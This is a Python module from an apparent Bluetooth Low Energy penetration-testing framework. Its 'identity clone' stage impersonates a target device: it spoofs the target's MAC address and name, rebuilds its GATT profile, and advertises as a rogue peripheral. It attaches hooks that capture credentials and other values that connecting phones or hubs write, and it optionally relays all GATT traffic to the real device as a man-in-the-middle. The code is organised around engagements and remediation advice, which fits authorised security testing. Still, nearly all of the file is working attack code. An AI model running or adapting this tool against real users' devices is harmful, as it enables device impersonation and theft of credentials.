from datetime import datetime, timezone
from time import time, sleep
import subprocess
import threading

from whad.ble import UUID
from whad.ble.profile import (
    GenericProfile,
    PrimaryService,
    Characteristic,
)
from whad.ble.profile.advdata import AdvDataFieldList, AdvFlagsField, AdvCompleteLocalName
from whad.device import WhadDevice

from core.dongle import WhadDongle
from core.models import Target, Finding
from core.db import insert_finding
from core.logger import get_logger, prompt_line
from core.pcap import pcap_path, attach_monitor, detach_monitor
import config

log = get_logger("s3_clone")

CLONE_DURATION = 120


def _attach_write_hooks(profile: GenericProfile, written_log: list[dict]) -> None:
    """Attach on_write callbacks to all writable characteristics.

    Enables passive credential capture: every value a connecting central writes
    to our cloned peripheral is logged in real-time. Entire body is wrapped in
    try/except — if the installed WHAD version does not expose the required
    methods, hook attachment silently no-ops and current behaviour is unchanged.
    """
    try:
        count = 0
        for svc in profile.services():
            for char in svc.characteristics():
                if not char.writeable():
                    continue
                uuid_str = str(char.uuid)

                def _hook(c, v, wr, _log=written_log, _uuid=uuid_str):
                    entry = {
                        "uuid": _uuid,
                        "handle": c.handle,
                        "value_hex": bytes(v).hex() if v else "",
                        "without_response": bool(wr),
                        "ts": time(),
                    }
                    _log.append(entry)
                    log.info(
                        f"[S3] WRITE captured: uuid={_uuid} "
                        f"val={entry['value_hex']}"
                    )

                char.on_write(_hook)
                count += 1
        if count:
            log.debug(f"[S3] Write hooks attached to {count} characteristic(s)")
    except Exception as exc:
        log.debug(f"[S3] Write hook attach failed: {exc}")


def _run_spawn_relay(
    dongle: WhadDongle,
    target: Target,
    engagement_id: str,
) -> bool:
    """Transparent GATT relay via wble-spawn.

    Loads the S5-exported JSON profile and starts wble-spawn, which creates a
    BLE peripheral that forwards every GATT operation to the real device.
    Unlike the static clone, this relay mode requires the target to remain
    connectable throughout the session.

    Returns True if the relay ran successfully, False if it should fall back
    to the static clone.
    """
    import shutil
    if not shutil.which("wble-spawn"):
        log.warning("[S3-spawn] wble-spawn not in PATH — falling back to static clone.")
        return False

    addr_safe = target.bd_address.replace(":", "")
    profile_json = config.REPORT_DIR / f"s5_profile_{addr_safe}_{engagement_id}.json"
    if not profile_json.exists():
        log.warning(
            f"[S3-spawn] No S5 profile found at {profile_json} — "
            "run Stage 5 first. Falling back to static clone."
        )
        return False

    log.info(
        f"[S3-spawn] Starting transparent GATT relay for {target.bd_address} "
        f"via {profile_json} ..."
    )

    t_start = time()
    dongle.device.close()
    try:
        cmd = [
            "wble-spawn",
            "-i", config.INTERFACE,
            "-p", str(profile_json),
            target.bd_address,
        ]
        log.debug(f"[S3-spawn] cmd: {' '.join(cmd)}")
        subprocess.run(cmd, timeout=config.CONN_SNIFF_DURATION)
    except subprocess.TimeoutExpired:
        log.info(f"[S3-spawn] Relay window ({config.CONN_SNIFF_DURATION}s) elapsed.")
    except Exception as exc:
        log.warning(f"[S3-spawn] wble-spawn error: {type(exc).__name__}: {exc}")
    finally:
        import time as _time
        deadline = _time.time() + 15.0
        while _time.time() < deadline:
            try:
                dongle.device = WhadDevice.create(config.INTERFACE)
                break
            except Exception:
                _time.sleep(0.5)

    duration = round(time() - t_start, 1)
    finding = Finding(
        type="ble_spawn_relay",
        severity="info",
        target_addr=target.bd_address,
        description=(
            f"wble-spawn transparent GATT relay ran against {target.bd_address} "
            f"({target.name or 'unnamed'}) for {duration}s using profile {profile_json.name}. "
            "All GATT operations from connecting centrals were forwarded to the real device."
        ),
        remediation=(
            "Implement mutual authentication (LE Secure Connections with bonding). "
            "Centrals must validate peripheral identity before exchanging application data."
        ),
        evidence={
            "profile_json": str(profile_json),
            "duration_seconds": duration,
        },
        engagement_id=engagement_id,
    )
    insert_finding(finding)
    log.info(f"FINDING [info] ble_spawn_relay: {target.bd_address} — {duration}s relay")
    return True


def run(
    dongle: WhadDongle,
    target: Target,
    engagement_id: str,
    gatt_profile: list[dict] | None = None,
) -> None:
    log.info(
        f"Cloning target {target.bd_address} "
        f"({target.name or 'unnamed'}, {target.device_class})"
    )

    # Spawn relay mode: use wble-spawn for transparent GATT relay if configured.
    if config.S3_SPAWN_MODE:
        if _run_spawn_relay(dongle, target, engagement_id):
            return
        log.info("[S3-spawn] Falling back to static clone mode.")

    # --- Operator customisation prompts ---
    default_name = target.name or "Unknown"
    raw = prompt_line(f"Advertise name [{default_name}]: ")
    clone_name = (raw or "").strip() or default_name

    default_addr = target.bd_address
    raw = prompt_line(f"Spoof MAC address [{default_addr}]: ")
    clone_addr = (raw or "").strip() or default_addr

    raw = prompt_line(f"Advertise duration in seconds [{CLONE_DURATION}]: ")
    try:
        clone_duration = int((raw or "").strip())
        if clone_duration <= 0:
            raise ValueError
    except ValueError:
        clone_duration = CLONE_DURATION

    log.info(
        f"[S3] Clone config — name={clone_name!r}  addr={clone_addr}  "
        f"duration={clone_duration}s"
    )

    if gatt_profile:
        log.info(
            f"[S3] Full GATT profile available ({len(gatt_profile)} chars) — "
            "building faithful clone."
        )
        profile = _build_full_clone_profile(target, gatt_profile, clone_name)
    else:
        profile = _build_clone_profile(target, clone_name)

    # Build adv data with the operator-chosen name
    adv_data = AdvDataFieldList(
        AdvFlagsField(),
        AdvCompleteLocalName(clone_name.encode("utf-8", errors="replace")),
    )

    written_log: list[dict] = []
    _attach_write_hooks(profile, written_log)

    periph = dongle.peripheral(profile=profile)
    _monitor = None
    _pcap = pcap_path(engagement_id, 3, target.bd_address)
    _monitor = attach_monitor(periph, _pcap)

    if dongle.caps.can_spoof_bd_addr:
        try:
            periph.set_bd_address(clone_addr)
            log.info(f"BD address spoofed to {clone_addr}")
        except Exception as exc:
            log.warning(
                f"BD address spoofing failed at runtime: {exc}. "
                "Proceeding with native address."
            )
    else:
        log.warning(
            "BD address spoofing not available on this dongle — "
            "clone will advertise from native address."
        )

    try:
        periph.enable_adv_mode(adv_data=adv_data)
        log.info(f"Advertising as {clone_name!r}")
    except Exception as exc:
        log.debug(f"enable_adv_mode failed: {exc}")

    connections_received: list[dict] = []
    stop_event = threading.Event()

    original_on_connect = getattr(profile, "on_connect", None)

    def _on_connect(conn_handle):
        now = datetime.now(timezone.utc)
        log.info(f"[S3] Central connected to clone! handle={conn_handle}")
        connections_received.append(
            {
                "conn_handle": conn_handle,
                "connected_at": now.isoformat(),
                "timestamp": now.isoformat(),
            }
        )
        if original_on_connect:
            original_on_connect(conn_handle)

    profile.on_connect = _on_connect

    def _on_disconnect(conn_handle):
        now = datetime.now(timezone.utc)
        log.info(f"[S3] Central disconnected: handle={conn_handle}")
        for session in reversed(connections_received):
            if (
                session.get("conn_handle") == conn_handle
                and "disconnected_at" not in session
            ):
                session["disconnected_at"] = now.isoformat()
                try:
                    t0 = datetime.fromisoformat(session["connected_at"])
                    dwell = (now - t0).total_seconds()
                    session["dwell_seconds"] = round(dwell, 1)
                    log.info(f"[S3] Session dwell: {dwell:.1f}s")
                except Exception:
                    pass
                break

    try:
        profile.on_disconnect = _on_disconnect
    except Exception as exc:
        log.debug(f"[S3] on_disconnect hook not supported: {exc}")

    log.info(
        f"Starting rogue peripheral for {clone_duration}s. "
        f"Advertising as {clone_addr} / {clone_name!r}..."
    )

    periph.start()

    try:
        deadline = time() + clone_duration
        while time() < deadline and not stop_event.is_set():
            sleep(1.0)
    except KeyboardInterrupt:
        log.info("Clone interrupted by user.")
    finally:
        try:
            detach_monitor(_monitor)
            periph.stop()
        except Exception:
            pass

    severity = "critical" if connections_received else "medium"
    write_detail = (
        f" {len(written_log)} application write(s) captured from connecting central(s)."
        if written_log else ""
    )

    finding = Finding(
        type="identity_clone",
        severity=severity,
        target_addr=target.bd_address,
        description=(
            f"Rogue peripheral cloned {target.bd_address} "
            f"({target.name or 'unnamed'}) as {clone_name!r} / {clone_addr}. "
            f"{len(connections_received)} central(s) connected "
            f"to the clone during {clone_duration}s test window."
            f"{write_detail}"
        ),
        remediation=(
            "Implement mutual authentication (LE Secure Connections "
            "with bonding). Centrals should validate peripheral "
            "identity via IRK or certificate-based auth before "
            "exchanging application data."
        ),
        evidence={
            "cloned_addr": target.bd_address,
            "spoofed_addr": clone_addr,
            "cloned_name": target.name,
            "spoofed_name": clone_name,
            "device_class": target.device_class,
            "connections_received": connections_received,
            "total_dwell_seconds": sum(
                s.get("dwell_seconds", 0) for s in connections_received
            ),
            "duration_seconds": clone_duration,
            "writes_captured": written_log,
        },
        pcap_path=str(_pcap),
        engagement_id=engagement_id,
    )
    insert_finding(finding)

    log.info(
        f"FINDING [{severity}] identity_clone: "
        f"{target.bd_address} -- "
        f"{len(connections_received)} connection(s)"
    )

    _print_summary(target, connections_received, clone_name, clone_addr, clone_duration)


def _build_full_clone_profile(
    target: Target,
    gatt_profile: list[dict],
    clone_name: str,
) -> GenericProfile:
    """Build a GenericProfile faithfully reconstructed from a captured GATT profile.

    Groups standard 0x2Axx characteristics under 0x1800; proprietary characteristics
    under a service inferred from target.services advertising data, or 0x1820 fallback.
    Characteristic values are taken from captured read results when available.
    """
    _PROP_MAP = {
        "read": "read",
        "write": "write",
        "write_no_resp": "write_without_response",
        "write_without_response": "write_without_response",
        "notify": "notify",
        "indicate": "indicate",
    }

    profile = GenericProfile()

    # Separate standard (0x2Axx) from proprietary characteristics
    standard: list[dict] = []
    proprietary: list[dict] = []
    for c in gatt_profile:
        uuid_str = c["uuid"].replace("-", "").lower()
        try:
            uuid_int = int(uuid_str, 16)
            if 0x2A00 <= uuid_int <= 0x2AFF:
                standard.append(c)
            else:
                proprietary.append(c)
        except ValueError:
            proprietary.append(c)

    def _make_char(c: dict) -> Characteristic:
        uuid_str = c["uuid"]
        try:
            uuid_clean = uuid_str.replace("-", "")
            uuid_int = int(uuid_clean, 16)
            uuid_obj = UUID(uuid_int) if uuid_int <= 0xFFFF else UUID(uuid_str)
        except (ValueError, Exception):
            uuid_obj = UUID(uuid_str)

        perms = [
            _PROP_MAP[p] for p in c.get("properties", []) if p in _PROP_MAP
        ] or ["read"]

        value = b"\x00"
        if c.get("value_hex"):
            try:
                value = bytes.fromhex(c["value_hex"])
            except ValueError:
                pass
        elif c.get("value_text"):
            value = c["value_text"].encode("utf-8", errors="replace")

        return Characteristic(uuid=uuid_obj, permissions=perms, value=value)

    # Build 0x1800 service for standard characteristics.
    # Override 0x2A00 (Device Name) with the operator-chosen clone_name.
    if standard:
        svc = PrimaryService(uuid=UUID(0x1800))
        for c in standard:
            try:
                char = _make_char(c)
                uuid_int = int(c["uuid"].replace("-", ""), 16)
                if uuid_int == 0x2A00:
                    char = Characteristic(uuid=UUID(0x2A00), permissions=["read"],
                                          value=clone_name.encode("utf-8"))
                svc.add_characteristic(char)
            except Exception as exc:
                log.debug(f"Could not add standard char {c['uuid']}: {exc}")
        profile.add_service(svc)
    else:
        # Always include at least a minimal 0x1800 service
        svc = PrimaryService(uuid=UUID(0x1800))
        svc.add_characteristic(Characteristic(uuid=UUID(0x2A00), permissions=["read"], value=clone_name.encode("utf-8")))
        profile.add_service(svc)

    # Build proprietary service(s)
    if proprietary:
        # Use the first non-standard service UUID from advertising, or 0x1820 fallback
        prop_svc_uuid_str = next(
            (
                s for s in target.services
                if s.lower() not in ("1800", "1801", "180a", "180d", "180f", "1810", "1812", "181a")
            ),
            None,
        )
        try:
            if prop_svc_uuid_str:
                if len(prop_svc_uuid_str) <= 4:
                    prop_svc_uuid = UUID(int(prop_svc_uuid_str, 16))
                else:
                    prop_svc_uuid = UUID(prop_svc_uuid_str)
            else:
                prop_svc_uuid = UUID(0x1820)
        except Exception:
            prop_svc_uuid = UUID(0x1820)

        prop_svc = PrimaryService(uuid=prop_svc_uuid)
        for c in proprietary:
            try:
                prop_svc.add_characteristic(_make_char(c))
            except Exception as exc:
                log.debug(f"Could not add proprietary char {c['uuid']}: {exc}")
        profile.add_service(prop_svc)

    return profile


def _build_clone_profile(target: Target, clone_name: str) -> GenericProfile:
    profile = GenericProfile()

    svc = PrimaryService(uuid=UUID(0x1800))
    svc.add_characteristic(
        Characteristic(
            uuid=UUID(0x2A00),
            permissions=["read"],
            value=clone_name.encode("utf-8"),
        )
    )
    svc.add_characteristic(
        Characteristic(
            uuid=UUID(0x2A01),
            permissions=["read"],
            value=b"\x00\x00",
        )
    )
    profile.add_service(svc)

    for svc_uuid in target.services:
        try:
            if len(svc_uuid) <= 4:
                uuid_obj = UUID(int(svc_uuid, 16))
            else:
                uuid_obj = UUID(svc_uuid)

            if uuid_obj.value in (0x1800, 0x1801):
                continue

            custom_svc = PrimaryService(uuid=uuid_obj)
            custom_svc.add_characteristic(
                Characteristic(
                    uuid=UUID(uuid_obj.value + 1)
                    if isinstance(uuid_obj.value, int)
                    else uuid_obj,
                    permissions=["read"],
                    value=b"\x00",
                )
            )
            profile.add_service(custom_svc)
        except Exception as exc:
            log.debug(f"Could not add service {svc_uuid}: {exc}")

    return profile


def _print_summary(
    target: Target,
    connections: list[dict],
    clone_name: str,
    clone_addr: str,
    clone_duration: int,
) -> None:
    log.info("\n" + "─" * 76)
    log.info("  STAGE 3 SUMMARY -- Identity Clone")
    log.info("─" * 76)
    log.info(f"  {'Real device':<18}: {target.bd_address}")
    log.info(f"  {'Real name':<18}: {target.name or '(unnamed)'}")
    log.info(f"  {'Device class':<18}: {target.device_class}")
    log.info(f"  {'Spoofed MAC':<18}: {clone_addr}")
    log.info(f"  {'Spoofed name':<18}: {clone_name}")
    log.info(f"  {'Clone duration':<18}: {clone_duration}s")
    log.info(f"  {'Centrals duped':<18}: {len(connections)}")
    if connections:
        for i, c in enumerate(connections):
            dwell = f"  dwell={c['dwell_seconds']}s" if "dwell_seconds" in c else ""
            log.info(f"    [{i + 1}] handle={c['conn_handle']}  at {c['timestamp']}{dwell}")
    log.info("─" * 76 + "\n")